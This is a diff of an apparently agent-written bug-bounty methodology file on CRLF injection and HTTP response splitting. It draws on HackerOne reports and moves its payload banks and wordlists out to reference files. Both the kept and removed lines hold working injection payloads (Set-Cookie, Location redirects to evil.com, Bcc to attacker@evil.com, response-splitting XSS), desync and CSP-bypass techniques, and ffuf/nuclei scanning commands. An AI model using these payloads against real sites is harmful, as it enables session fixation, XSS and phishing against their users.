@@ -4,13 +4,13 @@ description: "Use for user input reflected into headers, redirects, filenames, c
 agent_created: true
 ---
 
-# CRLF Injection and Response Splitting — unified skill
+# CRLF Injection and Response Splitting — unified methodology
 
-> **Complete merged skill.** Everything from 2 upstream skills across h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 2 upstream skills across h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 115 valid HackerOne reports (19 paid / 17%)
+## Corpus signal — 115 valid reports (19 paid / 17%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,111 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | admin / privileged-role context | 11 |
 | HTTP method / verb tampering | 10 |
 | subdomain / DNS / cert-transparency recon | 8 |
-| XML / SOAP / SAML / XXE | 6 |
-| JS bundle / source-map inspection | 6 |
-| intercept & replay request in Burp | 5 |
-| second-order / stored / blind delivery | 5 |
-|  HosT/absolute-URL reset poisoning | 4 |
-| error message / stack trace probing | 4 |
-| two-account / cross-account replay | 4 |
-| API docs / Swagger / introspection | 4 |
-| redirect chain / Location header | 3 |
-| race / concurrency / timing | 3 |
-| OAST / DNS / HTTP callback proof | 3 |
-| unauthenticated / removed-cookie test | 3 |
-| deserialization / gadget chain | 3 |
-| DOM / HTML source inspection | 2 |
-| employee / developer public info | 2 |
-| parameter pollution / duplicate keys | 2 |
-| JWT / token / base64 decode | 2 |
-| third-party data / paste / breach reuse | 2 |
-| webhook / OAuth / SAML / integration abuse | 1 |
-| verbose debug / framework fingerprint | 1 |
-| mass assignment / extra request fields | 1 |
-| git history / exposed .git | 1 |
-
-### Parameters observed in writeups
-
-`result` (10), `test` (6), `domain` (4), `crlf` (3), `mycookie` (2), `max-age` (2), `session` (2), `curl` (2), `headers` (2), `_ga` (1), `_gat` (1), `chrome` (1), `test2` (1), `newsletter_signup_email` (1), `newsletter_signup_zipcode` (1), `newsletter_placement` (1), `response` (1), `failures` (1), `session_token` (1), `wpn_ad_cookie` (1), `notify` (1), `h3name.len` (1), `injection` (1), `client_source_ip` (1), `client_dest_ip` (1), `is_ipv6` (1), `haproxyprotocol` (1), `injected_ip` (1), `target` (1), `curlopt_transfertext` (1)
-
-### Bypass primitives observed
-
-`crlf` (274), `%0d%0a` (116), `bypass` (34), `host header` (30), `content-type` (28), `desync` (15), `header injection` (11), `bypassing` (6), `bypassed` (5), `transfer-encoding` (5), `whitelist` (5), `blind` (5), `bypasses` (5), `chunked` (4), `url encoded` (3), `lowercase` (2), `open redirect` (2), `null byte` (2), `unicode` (1), `url encoding` (1), `url-encoded` (1), `percent-encoded` (1), `allowlist` (1)
-
-### Impact language observed
-
-`localhost` (34), `password` (33), `token` (26), `admin` (25), `unauthorized` (13), `credential` (7), `secret` (4), `internal service` (3), `arbitrary command` (3), `internal network` (3), `remote code execution` (2), `data leak` (1), `rce` (1), `exfiltrate` (1), `exfiltratio` (1)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [1200647](https://hackerone.com/reports/1200647) — Grafana RCE via SMTP server parameter injection
-
-Aiven Ltd · $5000 · critical
-
-## Summary: This report is similar to [#1180653]( except with different parameter injection entrypoint. SMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server. ## Steps To Reproduce: 1.Create Aiven Grafana instance 2.Setup netcat listener on your server: `nc -n -lvp 4444` 3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic. 4. Browse to to trigger the exploit. ## Impact Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.
-
-#### [1878489](https://hackerone.com/reports/1878489) — CRLF Injection in Nodejs ‘undici’ via host
-
-Internet Bug Bounty · $600 · medium
-
-Summary: undici library should be protects HTTP headers from CRLF injection vulnerabilities. However, CRLF injection exists in the ‘host’ header of undici.request api. Description: like Source code: lib/core/request.js:296 Example: {F2182450} I have submitted the report： Security Releases: Security Advisory: ## Impact All versions of the 19.x, 18.x and 16.x release lines.
-
-#### [409512](https://hackerone.com/reports/409512) — mod_userdir CRLF injection (CVE-2016-4975)
-
-Internet Bug Bounty · $500 · medium
-
-Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the "Location" or other outbound header key or value. Reported to security team 24th July 2016 Issue public 14th August 2018 Update Released 20th December 2016 Affects 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 ## Impact CRLF Injection
-
-#### [66386](https://hackerone.com/reports/66386) — [www.*.myshopify.com] CRLF Injection
-
-Shopify · $500 · severity n/a
-
-CRLF Injection via Request-URI PoC: HTTP Response: Result: Creating a cookie-param "test=test" on *.myshopify.com
-
-#### [2147132](https://hackerone.com/reports/2147132) — Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection via "redirect_uri" parameter
-
-Mozilla · $200 · low
-
-## Summary: CRLF / HTTP Header Injection. Allows you to set any headers/etc (Set-Cookie...) Page: Parameter: redirect_uri ## Steps To Reproduce: PoC - does not require authorization: 1. 2. or (with true redirect): HTTP response: ## Impact ## Summary: Possible manipulation of user session / open redirect.
-
-#### [2189960](https://hackerone.com/reports/2189960) — CRLF injection leads to internal XSS on PangleGlobal
-
-TikTok · no bounty — still valid · medium
-
-A cross-site scripting vulnerability was found on a Pangle endpoint due to CRLF injection on the 'file_name' parameter. This was caused by the reflection of user-supplied data without appropriate HTML escaping or output encoding and could have resulted in a JavaScript payload being injected into the above endpoint and executed within the context of the another user's browser. This vulnerability has been resolved. We thank @serverinspector for reporting this to our team.
-
-#### [712979](https://hackerone.com/reports/712979) — Creating malformed URLs via new line character in-between two URLs leads to misrepresented hyperlinks in Tweets/DMs
-
-X / xAI · no bounty — still valid · low
-
-## Summary When composing a tweet or a direct message it is possible to use a new line character (`%0d`) to seperate two URLs within the actual hyperlinking process, but not the URL displaying process. The new line character acts as an invisible character that disrupts the actual hyperlinking process, whereas when previewed does not show up. This allows an attacker to create realistic looking phishing URLs via combining `attacker.com` + `%0d` + `website.com`. If an attacker controlled both `itter.com` and `fakewebsite.tw` in the below request, they could trick victim's into browsing to, what they think would be, `fakewebsite.twitter.com`. These two URLs, when put together and displayed, would look like the following on a tweet or a direct message: {F606210} But, after being actually clicked, would take you to the following URLs: {F606211} * [ {F606212} * [ This is also possible to do in direct messages, as so... {F606213} ## Description I don't think this falls under any real classification of issues other than "CRLF injection", but even then, it's definitely not the right category. This is simply abusing Twitter's URL composing process to create fake hyperlinks. Overall I think this is a neat issue that I think would definitely be exploited by bad actors. ## Steps To Reproduce: 1.) Open either (1) direct messages, or (2) composing a tweet 2.) Type out `fakewebsite.twitter.com`
-
-### Recurring approach patterns from real reports
-
-- 2× limitations the test server is a minimal synthetic model built to isolate and prove the session tracking by resource behavior pattern we have not tested against and are not claiming to have compromised any specific real ip camera nvr or other rtsp server product
-- 1× sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted url
-- 1× poc i sent this post request to a test email post body the resulting response the referrer attritube is encoded and sent to the victims email
-- 1× hey guys i found that the site is vulnerable to a crlf injection
-- 1× in this case this is could be done by modifying an http request directed to the adding for example the following payload 0d 0aset cookie test2 test domain with the preceding payload an attacker is going to set on the victim s browser that is visiting the malicious url a new cookie with an arbitrary value
-- 1× i recently discovered that we can add arbitery value in reset pass token and compromise the life time unlimitedly
-- 1× okay so i decoded the value and changed year to instead of and it s all done miracle i got this page with different warning
-- 1× the agent application was vulnerable to a response splitting attack when parsing line feed characters in a given url
-- 1× i found crlf injection a few months ago
-- 1× description during the recent penetration test i have found a whitelist bypass using crlf injection
-- 1× as mentioned in the description i was able to bypass a whitelist function during the recent penetration test and exploit a medium high vulnerability thanks to it
-- 1× the aivenv1 token can be retrieved by inspecting the browser traffic
-- 1× i added additional logging to var www nextcloud 3rdparty swiftmailer swiftmailer lib classes swift transport abstractsmtptransport php to confirm that the commands were injected
-- 1× this is most commonly done by modifying an http parameter or url
-- 1× ai statement yes i have used ai to find the vulnerability
-- 1× affected version i have tested on ubuntu with curl system curl dev my local build pycurl with libcurl dev the full system curl version the full local build version steps to reproduce
-- 1× run a test smtp server the one i used is listed below named smtp server ran as smtp server and listened at localhost
-- 1× supporting material references normal mail send sending with crlf in from field sending with crlf in rcpt field sending with crlf using pycurl server logs for the illustration smtp server script send with pycurl script impact summary this vulnerability allows attackers to inject arbitrary smtp commands like vrfy by crafting malicious email addresses
-- 1× the strict standard safe lib urlapi c when parsing a full url e g smtp libcurl uses curl junkscan to ensure no control characters are present
-- 1× summary i have discovered a crlf injection vulnerability in the imap protocol implementation of libcurl
-- 1× result the server receives a002 login hacker logout password123 expected behavior the username should be quoted e g hacker r nlogout or the client should reject the crlf characters before sending
-- 1× the issue occurs before any server side parsing
-- 1× run monerod with zmq rpc reachable from the test host and with logging enabled for request traces
-- 1× verification markers attacker marker begin and attacker marker end should appear in daemon logs along with forged looking payload line text
 
 ## Corpus-backed method (this class)
 
@@ -157,18 +52,13 @@ X / xAI · no bounty — still valid · low
 
 - CRLF in redirect -> header injection -> cache poisoning or session fix.
 
-### Probes
-
-- %0d%0a, %0a, %0d, Unicode U+2028/U+2029, double-encoded variants in header-reflecting params.
-
 ### Veteran tip
 
 Corpus bypasses cluster around encoding layers — test the decoder before writing a payload.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -193,10 +83,7 @@ Start here. These are the highest-yield tests for this class.
 - SMTP/header contexts: email `subject`, `from`, `to`, and `filename` fields that are copied into mail headers.
 - Classic Nginx misconfiguration to fingerprint: `proxy_pass http://backend$uri;` or `return 302 https://example.com$uri;` — Nginx URL-normalises `$uri`, decoding `%0d%0a` before forwarding upstream. OpenResty/Tengine inherit the same flaw.
 - HTTP/2 downgrade surfaces: any front-end that folds header values into an HTTP/1.1 request; CRLF in an HTTP/2 header value can create a second header on the back end.
-- 2025-2026 case studies worth modelling: Pi-hole web GHSA-5v79-p56f-x7c4 (session fixation + response splitting), curl `Curl_add_custom_headers` H1 #3484431 (request smuggling/SSRF), TikTok cookie tossing, telecom access-token theft ($20k), clothing-store account takeover via injected `Transfer-Encoding` ($2.2k).
-
-### Signals and surfaces
-
+- 2025-2026 case studies worth modelling: Pi-hole web GHSA-5v79-p56f-x7c4 (session fixation + response splitting), curl `Curl_add_custom_headers` H1 #3484431 (request smuggling/SSRF), TikTok cookie tossing, telecom access-token theft ($20k), clothing-store account takeover via injected `Transfer-Encoding` ($2.2k).### Signals and surfaces
 ### Signal
 
 - Reports: **168** · paid: **25**
@@ -220,10 +107,7 @@ Start here. These are the highest-yield tests for this class.
 
 Parameters, endpoints, and fields that commonly carry this bug:
 
-`redirect` `next` `url` `filename` `email` `subject` `log`
-
-### Techniques, payloads and bypasses
-
+`redirect` `next` `url` `filename` `email` `subject` `log`### Techniques and bypasses
 ### Payloads & probes
 
 - `%0d%0aSet-Cookie:%20x=1` `%0aLocation:%20//evil.com`
@@ -342,10 +226,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 - Nested response splitting CSP bypass (siunam, 2025): inject `Content-Length` and a second response whose body is a `Content-Type` + `<script>` pair, so a strict `script-src 'self'` CSP is bypassed because the script appears to come from a same-origin static path. Fixed-length Content-Length can be handled by padding with junk.
 - CDN-Cache-Control trick: inject `CDN-Cache-Control: private="Location"` to make Cloudflare strip the `Location` header, allowing XSS to fire on a redirect response; combine with `Content-Type: text/html;charset=ISO-2022-JP` and escaped script tokens to evade WAF signatures.
 - Reverse desync (classic 2004 response splitting): inject `Content-Length: 0` plus a second response in the *server's* reply; usually blocked today by stacked-response handling, but worth testing.
-- Browser-powered desync: most CRLF-powered attacks work via `fetch()` or navigation — use `window.open()` + `location` or rapid iframe creation for connection-/IP-locked cases, enabling desync worms and HttpOnly cookie theft via HEAD/Range over-read.
-
-### Validation and proof
-
+- Browser-powered desync: most CRLF-powered attacks work via `fetch()` or navigation — use `window.open()` + `location` or rapid iframe creation for connection-/IP-locked cases, enabling desync worms and HttpOnly cookie theft via HEAD/Range over-read.### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -393,18 +274,12 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 - For header injection found by a scanner, PortSwigger's 2026 "one prompt" workflow is: identify the upstream injection location, validate via request splitting with unique status codes, mini-crawl for a redirect gadget (Host / X-Forwarded-Host / absolute URL), then combine prefix + gadget into the exploit.
 - Always capture the raw hex of the injected bytes when reporting a request-smuggling chain — hex dumps are decisive evidence that CRLF was transmitted unsanitized (as in curl H1 #3484431).
 - For log-injection variants, demonstrate the forged entry in the actual log view (or a log-shipping sink) rather than only in the request — the impact is analyst confusion and delayed detection.
-- A single extra header is often enough: a forged `X-Forwarded-For`, `X-Original-URL`, or `X-Rewrite-URL` can alter upstream authorization or routing even when response splitting is blocked.
-
-### Escalation and related chains
-
+- A single extra header is often enough: a forged `X-Forwarded-For`, `X-Original-URL`, or `X-Rewrite-URL` can alter upstream authorization or routing even when response splitting is blocked.### Escalation and related chains
 ### Escalation chains
 
 - CRLF -> XSS.
 - CRLF -> cache poisoning.
-- CRLF -> smuggling.
-
-### Tools and wordlists
-
+- CRLF -> smuggling.### Tools
 ### Tools
 
 `Burp` · `crlfuzz` · `interactsh`
@@ -445,10 +320,7 @@ nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
 # authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
 ```
 
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Sources and related reading
-
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -479,10 +351,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class crlf
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/research/crlf-powered-desync-attacks
-2. https://owasp.org/www-community/attacks/HTTP_Response_Splitting
-
-### Additional notes
-
+2. https://owasp.org/www-community/attacks/HTTP_Response_Splitting### Additional notes
 ### Header injection
 
 ```text
@@ -543,243 +412,8 @@ Copyable lists:
 ### CRLF to XSS & Open Redirection
 
 `#2012519` · TikTok · $0 · high · 2023-08-16 · ▲97
-> Due to inadequate input validation, it could have been possible to inject CRLF (HTTP Response Splitting) into the parameter " hack redirect now " on a TikTok seller endpoint. This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect. This vulnerability has been resolved.
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# CRLF / Header Injection — HackerOne field guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- `%0d%0aSet-Cookie:%20x=1` `%0aLocation:%20//evil.com`
-
-- `%E5%98%8A%E5%98%8D` unicode CRLF
-
-- `\r\n` in filenames and log lines
-
-
-
-## Payload bank
-
-
-
-**20 curated payloads** in 2 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.
-
-
-
-### Header injection
-
-
-
-```text
-
-%0d%0aSet-Cookie:%20x=1
-
-%0aSet-Cookie:%20x=1
-
-%0d%0aLocation:%20//evil.com
-
-%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
-
-%0d%0aX-XSS-Protection:%200
-
-%0d%0a%0d%0a<script>alert(1)</script>
-
-%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
-
-%E5%98%8A%E5%98%8DLocation:%20//evil.com
-
-\r\nSet-Cookie: x=1
-
-\nSet-Cookie: x=1
-
-%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None
-
-%0d%0aRefresh:%200%3burl=//evil.com
-
-```
-
-
-
-### Email / log / filename contexts
-
-
-
-```text
-
-%0d%0aBcc: attacker@evil.com
-
-%0d%0aCc: attacker@evil.com
-
-%0d%0aSubject:%20injected
-
-a%0d%0aBcc:attacker@evil.com
-
-file%0d%0aSet-Cookie:%20x=1.txt
-
-line1%0d%0aline2
-
-%0d%0a%09injected
-
-%0d%0a%20injected
-
-```
-
-
-
-Copyable lists:
-
-- `~/.local/share/hackerone-reports/wordlists/payloads_crlf-injection.txt` (20)
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 14× | `\r\n` |
-
-| 5× | `rtsp_do()` |
-
-| 5× | `data->set.crlf` |
-
-| 5× | `conn_config->CRLfile` |
-
-| 5× | `Curl_setstropt()` |
-
-| 4× | `Curl_creader_total_length()` |
-
-| 3× | `Mail_mimePart::encodeHeader()` |
-
-| 3× | `cr_init_backend()` |
-
-| 3× | `auth_digest_string_quoted()` |
-
-| 2× | `r\n` |
-
-| 2× | `%0d` |
-
-| 2× | `curl_easy_setopt()` |
-
-| 2× | `stripcslashes()` |
-
-| 2× | `preg_match('#([^\s\x21-\x7E]){1}#')` |
-
-| 2× | `Net_SMTP::quotedata()` |
-
-| 2× | `http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0` |
-
-| 2× | `rtsp_setup_request()` |
-
-| 2× | `rtsp_header_alloc()` |
-
-| 2× | `legit@example.com` |
-
-| 2× | `invalid ${key} header` |
-
-
-
-## Parameters observed
-
-
-
-`mode` · `newsletter_placement` · `_task` · `_action` · `client_id` · `redirect_uri` · `response_type` · `next_view` · `source` · `reported_user_id` · `reporter_user_id` · `is_media` · `is_promoted` · `reported_tweet_id` · `apikeyrefresh` · `act` · `redirecturl` · `ref` · `cards_platform` · `include_cards`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_crlf-injection.txt` | 94 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_crlf-injection.txt` | 51 |
-
-| `~/.local/share/hackerone-reports/wordlists/payloads_crlf-injection.txt` | 20 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_crlf-injection.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_crlf-injection.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_crlf-injection.txt \
-
-     -mr '<hit-marker>' -rate 20
-
-```
-
-
-
-## Nuclei
-
-
-
-Test params reflected in headers, redirects, filenames, and emails.
-
-
-
-```sh
-
-nuclei -u https://target -tags crlf \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_crlf-injection.txt
-
-nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/crlf -dast \
-
-       -rl 40 -o nuclei_crlf-injection_crlf.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
-
-       -rl 40 -o nuclei_crlf-injection_generic.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Companion: hunting / references/techniques.md
+> Due to inadequate input validation, it could have been possible to inject CRLF (HTTP Response Splitting) into the parameter " hack redirect now " on a TikTok seller endpoint. This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect. This vulnerability has been resolved.### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # CRLF / Header Injection — HackerOne field guide — Technique reference
 
@@ -1029,231 +663,13 @@ python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class crlf-i
 
 python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class crlf-injection --min-bounty 1000
 
-```
+```## Probes
 
-## Corpus payload bank (curated)
+- %0d%0a, %0a, %0d, Unicode U+2028/U+2029, double-encoded variants in header-reflecting params.
 
-### Header injection
+## Supporting data
 
-```text
-%0d%0aSet-Cookie:%20x=1
-%0aSet-Cookie:%20x=1
-%0d%0aLocation:%20//evil.com
-%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
-%0d%0aX-XSS-Protection:%200
-%0d%0a%0d%0a<script>alert(1)</script>
-%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
-%E5%98%8A%E5%98%8DLocation:%20//evil.com
-\r\nSet-Cookie: x=1
-\nSet-Cookie: x=1
-%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None
-%0d%0aRefresh:%200%3burl=//evil.com
-```
-
-### Email / log / filename contexts
-
-```text
-%0d%0aBcc: attacker@evil.com
-%0d%0aCc: attacker@evil.com
-%0d%0aSubject:%20injected
-a%0d%0aBcc:attacker@evil.com
-file%0d%0aSet-Cookie:%20x=1.txt
-line1%0d%0aline2
-%0d%0a%09injected
-%0d%0a%20injected
-```
-
-## Corpus wordlists (mined)
-
-### `params_crlf-injection.txt`
-
-```text
-mode
-newsletter_placement
-_task
-_action
-client_id
-redirect_uri
-response_type
-next_view
-source
-reported_user_id
-reporter_user_id
-is_media
-is_promoted
-reported_tweet_id
-apikeyrefresh
-act
-redirecturl
-ref
-cards_platform
-include_cards
-include_composer_source
-include_ext_alt_text
-include_reply_count
-tweet_mode
-dm_users
-include_groups
-include_inbox_timelines
-include_ext_media_color
-conversation_id
-recipient_ids
-request_id
-ext
-error
-requesturl
-newsletter_signup_zipcode
-hl
-src
-sync_remote
-redirect_url
-_ajax
-value
-tab
-al
-hash
-hints
-name
-port
-path
-uri
-coo
-email
-```
-
-### `paths_crlf-injection.txt`
-
-```text
-/__session_start__/%0aSet-Cookie:malicious_cookie1
-/blog/articles/automated-detection-of-host-header-attacks/
-/index.html
-/xxcrlftest
-/admin
-/sap/public/bc/icf/logoff
-/login.cgi
-/dashboard
-/issue35906
-/unicorn-public/20210226111552.GA22901@dcvr/T/
-/).each
-/nginx.conf:/etc/nginx/nginx.conf:ro
-/1.1/dm/new.json
-/v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME
-/render/x
-/test/dashboard
-/test/settings
-/signin
-/in/ezequielpuig
-/responsibility/global-report/policies
-/%0D%0ASet-Cookie:crlfinjection=crlfinjection
-/apps/calendar/appointment/1/book
-/apps/calendar
-/%3f%0D%0ALocation:/
-/billing-admin/profile/subscription/
-/remote.php/dav/calendars/nextcloud/personal/
-/remote.php/dav/calendars/nextcloud/personal/██████.ics
-/omnibus/settings/redis.html
-/bbbbb/ccccc
-/mirror/update_now
-/%0d%0a%09headername:%20headervalue
-/get
-/blockstack/blockstack-core/index.html
-/████████/Account/ForgotPassword
-/██████/Account/ForgotPassword
-/█████████/Account/ForgotPassword
-/████/Account/ForgotPassword
-/Account/ForgotPassword
-/WhoService/getCaseStats
-/%3f%0d%0a%09set-cookie:+hello=yoyoo
-/index.php
-/html/rfc1945
-/security/vulnerabilities_24.html
-/security/vulnerabilities_22.html
-/camera-B
-/camera-A
-/v0/vote
-/vulnerabilities/web/host-header-attack
-/path/to/libcurl.a
-/issue22928
-/security/cve/cve-2016-5699
-/settings/account
-/CRL
-/CN=VF
-/CN=localhost
-/path/to/curl/src/curl
-/news/96
-/en/blog/vulnerability/february-2023-security-releases/
-/api
-/vuln/detail/CVE-2020-26116
-/Linux
-/data/definitions/93.html
-/docs/security.html
-/remote.php/dav/files/user/%09%0a%0b%0ddir%09%0a%0b%0d
-/index.php/apps/files/
-/remote.php/webdav/%09%0a%0b%0dfile%09%0a%0b%0d
-/CN=localhost/O=PoC/C=AU
-/CN=F28
-/path
-/al_settings.php
-/stickers
-/attachments
-/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/
-/cgi-bin/cvename.cgi
-/api/
-/~fickov/statement.json
-/admin/secret
-/legitimate
-/foo2
-/delete
-/RFC
-/docs/CVE-2012-0036.html
-/sign-in
-/r.php
-/r.php%20HTTP/1.1%0d%0ax-injection
-/advanced%0D%0ASet-Cookie:test2=test;domain=
-/advanced
-/admin.cgi
-/admin.cgi%0d%0aNewHeader:Value
-/dashboard/%0d%0aHeader
-/dashboard/%0d%0aContent-Type
-/incoming.php
-/dashboard/
-/page/in-context-localization
-```
-
-### `payloads_crlf-injection.txt`
-
-```text
-%0d%0aSet-Cookie:%20x=1
-%0aSet-Cookie:%20x=1
-%0d%0aLocation:%20//evil.com
-%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
-%0d%0aX-XSS-Protection:%200
-%0d%0a%0d%0a<script>alert(1)</script>
-%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
-%E5%98%8A%E5%98%8DLocation:%20//evil.com
-\r\nSet-Cookie: x=1
-\nSet-Cookie: x=1
-%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None
-%0d%0aRefresh:%200%3burl=//evil.com
-%0d%0aBcc: attacker@evil.com
-%0d%0aCc: attacker@evil.com
-%0d%0aSubject:%20injected
-a%0d%0aBcc:attacker@evil.com
-file%0d%0aSet-Cookie:%20x=1.txt
-line1%0d%0aline2
-%0d%0a%09injected
-%0d%0a%20injected
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-crlf-injection`
-- `hunting` — `crlf-injection`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 3 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
